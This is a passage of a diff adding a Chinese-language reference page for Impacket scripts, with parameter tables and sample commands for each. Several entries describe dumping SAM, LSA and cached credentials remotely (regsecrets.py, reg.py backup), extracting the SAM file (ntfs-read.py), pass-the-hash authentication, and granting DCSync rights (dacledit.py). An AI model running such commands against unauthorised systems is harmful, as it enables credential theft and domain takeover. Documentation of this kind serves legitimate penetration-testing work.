+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python services.py domain/username:password@target_ip <span class="built_in">list</span></span><br><span class="line">python services.py domain/username:password@target_ip status <span class="string">&quot;WinRM&quot;</span></span><br><span class="line">python services.py domain/username:password@target_ip start <span class="string">&quot;WinRM&quot;</span></span><br><span class="line">python services.py domain/username:password@target_ip stop <span class="string">&quot;WinRM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="registry-read-py"><a href="#registry-read-py" class="headerlink" title="registry-read.py"></a>registry-read.py</h3><p><strong>功能</strong>: 读取远程注册表<br><strong>用途</strong>: 从注册表配置单元读取数据</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>hive</code></td>
+<td>要打开的注册表配置单元</td>
+</tr>
+<tr>
+<td><code>enum_key</code></td>
+<td>枚举指定开放注册表项的子项</td>
+</tr>
+<tr>
+<td><code>enum_values</code></td>
+<td>枚举指定开放注册表项的值</td>
+</tr>
+<tr>
+<td><code>get_value</code></td>
+<td>检索指定注册表值的数据</td>
+</tr>
+<tr>
+<td><code>get_class</code></td>
+<td>检索指定注册表类的数据</td>
+</tr>
+<tr>
+<td><code>walk</code></td>
+<td>从命名节点向下遍历注册表</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python registry-read.py HKLM enum_key SOFTWARE</span><br><span class="line">python registry-read.py HKCU get_value Environment PATH</span><br><span class="line">python registry-read.py HKLM walk SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></table></figure>
+
+<h3 id="reg-py"><a href="#reg-py" class="headerlink" title="reg.py"></a>reg.py</h3><p><strong>功能</strong>: 远程注册表管理工具<br><strong>用途</strong>: Windows 注册表操作脚本</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>query</code></td>
+<td>返回位于注册表中指定子键下的下一层子键和条目列表</td>
+</tr>
+<tr>
+<td><code>add</code></td>
+<td>向注册表添加新的子键或条目</td>
+</tr>
+<tr>
+<td><code>delete</code></td>
+<td>从注册表中删除子键或条目</td>
+</tr>
+<tr>
+<td><code>save</code></td>
+<td>将注册表的指定子键、条目和值的副本保存到指定文件中</td>
+</tr>
+<tr>
+<td><code>backup</code></td>
+<td>将 HKLM\SAM、HKLM\SYSTEM 和 HKLM\SECURITY 备份到指定文件</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-port [destination port]</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python reg.py query domain/username:password@target_ip HKLM\Software</span><br><span class="line">python reg.py add domain/username:password@target_ip HKCU\Software\Test <span class="string">&quot;ValueName&quot;</span> <span class="string">&quot;ValueData&quot;</span></span><br><span class="line">python reg.py delete domain/username:password@target_ip HKCU\Software\Test</span><br><span class="line">python reg.py backup domain/username:password@target_ip backup.reg</span><br></pre></td></tr></table></figure>
+
+<h3 id="regsecrets-py"><a href="#regsecrets-py" class="headerlink" title="regsecrets.py"></a>regsecrets.py</h3><p><strong>功能</strong>: 提取注册表密钥<br><strong>用途</strong>: 执行各种技术从远程机器提取密钥，无需在那里执行任何代理</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-system SYSTEM</code></td>
+<td>要解析的 SYSTEM 配置单元</td>
+</tr>
+<tr>
+<td><code>-bootkey BOOTKEY</code></td>
+<td>SYSTEM 配置单元的 bootkey</td>
+</tr>
+<tr>
+<td><code>-nosam</code></td>
+<td>不检索 SAM 信息</td>
+</tr>
+<tr>
+<td><code>-nocache</code></td>
+<td>不检索 MSCache 信息</td>
+</tr>
+<tr>
+<td><code>-nolsa</code></td>
+<td>不检索 LSASecrets</td>
+</tr>
+<tr>
+<td><code>-throttle THROTTLE</code></td>
+<td>操作之间的节流时间（秒）</td>
+</tr>
+<tr>
+<td><code>-outputfile OUTPUTFILE</code></td>
+<td>基础输出文件名（将为 sam、secrets 和 cached 添加扩展名）</td>
+</tr>
+</tbody></table>
+<p><strong>显示选项</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-history</code></td>
+<td>转储密码历史记录和 LSA secrets OldVal</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-keytab KEYTAB</code></td>
+<td>从 keytab 文件读取 SPN 的密钥</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python regsecrets.py domain/username:password@target_ip</span><br><span class="line">python regsecrets.py -debug -history domain/username:password@target_ip</span><br><span class="line">python regsecrets.py -outputfile secrets domain/username:password@target_ip</span><br><span class="line">python regsecrets.py -nosam -nocache domain/username:password@target_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="ntfs-read-py"><a href="#ntfs-read-py" class="headerlink" title="ntfs-read.py"></a>ntfs-read.py</h3><p><strong>功能</strong>: 读取 NTFS 文件系统<br><strong>用途</strong>: NTFS 资源管理器（只读）</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>volume</code></td>
+<td>要打开的 NTFS 卷（例如 <code>\\.\C:</code> 或 <code>/dev/disk1s1</code>）</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-extract EXTRACT</code></td>
+<td>提取路径名（例如 <code>\windows\system32\config\sam</code>）</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python ntfs-read.py \\.\C:</span><br><span class="line">python ntfs-read.py -extract \windows\system32\config\sam \\.\C:</span><br><span class="line">python ntfs-read.py -debug \\.\D:</span><br></pre></td></tr></table></figure>
+
+<h3 id="esentutl-py"><a href="#esentutl-py" class="headerlink" title="esentutl.py"></a>esentutl.py</h3><p><strong>功能</strong>: ESENT 数据库工具<br><strong>用途</strong>: 扩展存储引擎实用程序，允许转储目录、页面和表</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>databaseFile</code></td>
+<td>要打开的 ESE 文件</td>
+</tr>
+<tr>
+<td><code>dump</code></td>
+<td>转储特定页面</td>
+</tr>
+<tr>
+<td><code>info</code></td>
+<td>转储数据库的目录信息</td>
+</tr>
+<tr>
+<td><code>export</code></td>
+<td>转储数据库的目录信息</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-page PAGE</code></td>
+<td>要打开的页面</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python esentutl.py file.edb info</span><br><span class="line">python esentutl.py file.edb dump -page <span class="number">10</span></span><br><span class="line">python esentutl.py file.edb export</span><br><span class="line">python esentutl.py -debug file.edb info</span><br></pre></td></tr></table></figure>
+
+<h3 id="attrib-py"><a href="#attrib-py" class="headerlink" title="attrib.py"></a>attrib.py</h3><p><strong>功能</strong>: 文件属性管理工具<br><strong>用途</strong>: 文件属性修改实用程序</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标系统，格式为 <code>[[domain/]username[:password]@]&lt;targetName or address&gt;</code></td>
+</tr>
+<tr>
+<td><code>share</code></td>
+<td>所需文件所在的共享</td>
+</tr>
+<tr>
+<td><code>path</code></td>
+<td>要查询或修改属性的文件路径</td>
+</tr>
+<tr>
+<td><code>query</code></td>
+<td>查询当前文件&#x2F;目录属性</td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td>修改文件&#x2F;目录属性</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+</tbody></table>
+<p><strong>连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p destination port, --port destination port</code></td>
+<td>连接到 SMB 服务器的目标端口</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-target-ip ip address</code></td>
+<td>目标机器的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-t seconds, --timeout seconds</code></td>
+<td>设置连接超时（秒）</td>
+</tr>
+</tbody></table>
+<p><strong>设置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-r, --readonly</code></td>
+<td>只读文件或目录</td>
+</tr>
+<tr>
+<td><code>-H, --hidden</code></td>
+<td>隐藏文件或目录</td>
+</tr>
+<tr>
+<td><code>-s, --system</code></td>
+<td>系统文件或目录</td>
+</tr>
+<tr>
+<td><code>-a, --archive</code></td>
+<td>需要归档的文件或目录</td>
+</tr>
+<tr>
+<td><code>-n, --normal</code></td>
+<td>没有其他属性设置的文件</td>
+</tr>
+<tr>
+<td><code>-t, --temporary</code></td>
+<td>用于临时存储的文件</td>
+</tr>
+<tr>
+<td><code>-c, --compressed</code></td>
+<td>压缩的文件或目录</td>
+</tr>
+<tr>
+<td><code>-o, --offline</code></td>
+<td>数据不可立即获取的文件</td>
+</tr>
+<tr>
+<td><code>-e, --encrypted</code></td>
+<td>加密的文件或目录</td>
+</tr>
+<tr>
+<td><code>-p, --pinned</code></td>
+<td>应保持完全本地存在的文件或目录</td>
+</tr>
+<tr>
+<td><code>-u, --unpinned</code></td>
+<td>不应保持完全本地存在的文件或目录</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python attrib.py domain/username:password@target_ip share path query</span><br><span class="line">python attrib.py domain/username:password@target_ip share path <span class="built_in">set</span> -r -h</span><br><span class="line">python attrib.py -k domain/username@target_ip share path query</span><br><span class="line">python attrib.py -hashes :<span class="built_in">hash</span> domain/username@target_ip share path <span class="built_in">set</span> -a</span><br></pre></td></tr></table></figure>
+
+<h3 id="changepasswd-py"><a href="#changepasswd-py" class="headerlink" title="changepasswd.py"></a>changepasswd.py</h3><p><strong>功能</strong>: 修改用户密码<br><strong>用途</strong>: 通过不同协议更改或重置密码</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>target</code></td>
+<td>目标，格式为 <code>[[domain/]username[:password]@]&lt;hostname or address&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>新凭据参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-newpass NEWPASS</code></td>
+<td>新密码</td>
+</tr>
+<tr>
+<td><code>-newhashes LMHASH:NTHASH</code></td>
+<td>新的 NTLM 哈希值，格式为 NTHASH 或 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数（目标用户）</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 NTHASH 或 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 Kerberos 有用）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数（可选，执行更改的特权用户）</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-altuser ALTUSER</code></td>
+<td>替代用户名</td>
+</tr>
+<tr>
+<td><code>-altpass ALTPASS</code></td>
+<td>替代密码</td>
+</tr>
+<tr>
+<td><code>-althash ALTHASH, -althashes ALTHASH</code></td>
+<td>替代 NT 哈希，格式为 NTHASH 或 LMHASH:NTHASH</td>
+</tr>
+</tbody></table>
+<p><strong>操作方法</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-protocol {smb-samr,rpc-samr,kpasswd,ldap}, -p {smb-samr,rpc-samr,kpasswd,ldap}</code></td>
+<td>用于密码更改&#x2F;重置的协议</td>
+</tr>
+<tr>
+<td><code>-reset, -admin</code></td>
+<td>尝试使用特权重置密码（可能绕过某些密码策略）</td>
+</tr>
+</tbody></table>
+<p><strong>Kerberos 身份验证</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器的 IP 地址</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python changepasswd.py domain/username:old_password@dc_ip -newpass new_password</span><br><span class="line">python changepasswd.py -protocol smb-samr domain/username:old_password@dc_ip -newhashes :<span class="built_in">hash</span></span><br><span class="line">python changepasswd.py -reset domain/username@dc_ip -newpass new_password -altuser administrator -altpass admin_password</span><br><span class="line">python changepasswd.py -protocol kpasswd domain/username:old_password@dc_ip -newpass new_password</span><br><span class="line">python changepasswd.py -protocol ldap domain/username:old_password@dc_ip -newpass new_password</span><br></pre></td></tr></table></figure>
+
+<h3 id="addcomputer-py"><a href="#addcomputer-py" class="headerlink" title="addcomputer.py"></a>addcomputer.py</h3><p><strong>功能</strong>: 向域添加计算机<br><strong>用途</strong>: 向域添加计算机账户并设置其密码</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>[domain/]username[:password]</code></td>
+<td>用于向 DC 进行身份验证的账户</td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-domain-netbios NETBIOSNAME</code></td>
+<td>域 NetBIOS 名称（如果 DC 有多个域则必需）</td>
+</tr>
+<tr>
+<td><code>-computer-name COMPUTER-NAME$</code></td>
+<td>要添加的计算机名称（如果省略，将使用随机的 DESKTOP-[A-Z0-9]{8}）</td>
+</tr>
+<tr>
+<td><code>-computer-pass password</code></td>
+<td>设置给计算机的密码（如果省略，将使用随机的 [A-Za-z0-9]{32}）</td>
+</tr>
+<tr>
+<td><code>-no-add</code></td>
+<td>不添加计算机，只设置现有计算机的密码</td>
+</tr>
+<tr>
+<td><code>-delete</code></td>
+<td>删除现有的计算机</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+<tr>
+<td><code>-method {SAMR,LDAPS}</code></td>
+<td>添加计算机的方法（SAMR 通过 SMB 工作，LDAPS 有一些证书要求）</td>
+</tr>
+<tr>
+<td><code>-port {139,445,636}</code></td>
+<td>要连接的目标端口（SAMR 默认 445，LDAPS 默认 636）</td>
+</tr>
+</tbody></table>
+<p><strong>LDAP 参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-baseDN DC=test,DC=local</code></td>
+<td>设置 LDAP 的 baseDN（如果省略，将使用账户参数中指定的域部分）</td>
+</tr>
+<tr>
+<td><code>-computer-group CN=Computers,DC=test,DC=local</code></td>
+<td>账户将添加到的组（如果省略，将使用 CN&#x3D;Computers）</td>
+</tr>
+</tbody></table>
+<p><strong>认证参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>要使用的域控制器的主机名</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip</code></td>
+<td>要使用的域控制器的 IP</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python addcomputer.py domain/username:password@dc_ip -computer-name <span class="string">&quot;COMPUTER$&quot;</span> -computer-<span class="keyword">pass</span> <span class="string">&quot;Password123&quot;</span></span><br><span class="line">python addcomputer.py domain/username:password@dc_ip -computer-name <span class="string">&quot;COMPUTER$&quot;</span> -method SAMR</span><br><span class="line">python addcomputer.py -delete domain/username:password@dc_ip -computer-name <span class="string">&quot;COMPUTER$&quot;</span></span><br><span class="line">python addcomputer.py -no-add domain/username:password@dc_ip -computer-name <span class="string">&quot;COMPUTER$&quot;</span> -computer-<span class="keyword">pass</span> <span class="string">&quot;NewPassword&quot;</span></span><br><span class="line">python addcomputer.py -method LDAPS domain/username:password@dc_ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="dacledit-py"><a href="#dacledit-py" class="headerlink" title="dacledit.py"></a>dacledit.py</h3><p><strong>功能</strong>: DACL 权限编辑工具<br><strong>用途</strong>: 读取和管理对象的自由访问控制列表</p>
+<p><strong>参数说明</strong>:</p>
+<p><strong>位置参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>identity</code></td>
+<td>域身份，格式为 <code>domain.local/username[:password]</code></td>
+</tr>
+</tbody></table>
+<p><strong>选项参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-use-ldaps</code></td>
+<td>使用 LDAPS 而不是 LDAP</td>
+</tr>
+<tr>
+<td><code>-ts</code></td>
+<td>为每个日志输出添加时间戳</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>开启调试输出</td>
+</tr>
+</tbody></table>
+<p><strong>认证与连接参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-hashes LMHASH:NTHASH</code></td>
+<td>NTLM 哈希值，格式为 LMHASH:NTHASH</td>
+</tr>
+<tr>
+<td><code>-no-pass</code></td>
+<td>不询问密码（对 -k 有用）</td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>使用 Kerberos 身份验证</td>
+</tr>
+<tr>
+<td><code>-aesKey hex key</code></td>
+<td>用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）</td>
+</tr>
+<tr>
+<td><code>-dc-ip ip address</code></td>
+<td>域控制器或 KDC 的 IP 地址</td>
+</tr>
+<tr>
+<td><code>-dc-host hostname</code></td>
+<td>域控制器或 KDC 的主机名</td>
+</tr>
+</tbody></table>
+<p><strong>主体参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-principal NAME</code></td>
+<td>sAMAccountName</td>
+</tr>
+<tr>
+<td><code>-principal-sid SID</code></td>
+<td>安全标识符</td>
+</tr>
+<tr>
+<td><code>-principal-dn DN</code></td>
+<td>可分辨名称</td>
+</tr>
+</tbody></table>
+<p><strong>目标参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target NAME</code></td>
+<td>sAMAccountName</td>
+</tr>
+<tr>
+<td><code>-target-sid SID</code></td>
+<td>安全标识符</td>
+</tr>
+<tr>
+<td><code>-target-dn DN</code></td>
+<td>可分辨名称</td>
+</tr>
+</tbody></table>
+<p><strong>DACL 编辑器参数</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-action [{read,write,remove,backup,restore}]</code></td>
+<td>对 DACL 执行的操作（默认：read）</td>
+</tr>
+<tr>
+<td><code>-file FILENAME</code></td>
+<td>文件名&#x2F;路径（对 -action backup 是可选的，对 -restore 是必需的）</td>
+</tr>
+<tr>
+<td><code>-ace-type [{allowed,denied}]</code></td>
+<td>要添加或删除的 ACE 类型（默认：allowed）</td>
+</tr>
+<tr>
+<td><code>-rights [{FullControl,ResetPassword,WriteMembers,DCSync,Custom}]</code></td>
+<td>要在目标 DACL 中写入&#x2F;删除的权限（默认：FullControl）</td>
+</tr>
+<tr>
+<td><code>-rights-guid RIGHTS_GUID</code></td>
+<td>表示要写入&#x2F;删除的权限的手动 GUID</td>
+</tr>
+<tr>
+<td><code>-mask &lt;mask&gt;</code></td>
+<td>强制访问掩码，可能的值：readwrite, write, self, allext, 0xXXXXX</td>
+</tr>
+<tr>
+<td><code>-inheritance</code></td>
+<td>在 ACE 标志中启用继承，使用 CONTAINER_INHERIT_ACE 和 OBJECT_INHERIT_ACE</td>
+</tr>
+</tbody></table>
+<p><strong>示例</strong>:</p>
